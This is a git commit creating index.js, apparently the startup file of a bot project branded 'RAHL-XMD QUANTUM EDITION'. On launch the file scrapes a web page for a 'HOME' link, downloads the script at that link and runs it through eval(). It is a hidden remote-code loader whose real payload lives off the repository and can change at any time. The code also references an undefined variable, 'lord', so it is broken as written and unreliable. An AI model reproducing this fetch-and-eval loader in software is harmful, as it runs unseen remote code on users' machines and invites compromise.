69c99740cbe2f10839799ff6a7ee50ac78d3883c
lord rahl <albertnyasimi27@gmail.com>
2025-10-28 21:37:43 +0300

    Create index.js

---
+++ index.js
@@ -0,0 +1,33 @@
+//  [RAHL-XMD QUANTUM EDITION]                                           
+//  >> A superposition of elegant code states                           
+//  >> Collapsed into optimal execution                                
+//  >> Scripted by Lord rahl                                    
+//  >> Version: 1.0.0quantum.7
+
+const axios = require('axios');
+const cheerio = require('cheerio');
+const adams = require("./config");
+
+async function fetchHOMEUrl() {
+  try {
+    const response = await axios.get(lord.RAHL_XMD);
+    const $ = cheerio.load(response.data);
+
+    const targetElement = $('a:contains("HOME")');
+    const targetUrl = targetElement.attr('href');
+
+    if (!targetUrl) {
+      throw new Error('heart not found 😭');
+    }
+
+    console.log('The heart is loaded successfully ✅');
+
+    const scriptResponse = await axios.get(targetUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
+}
+
+fetchHOMEUrl();
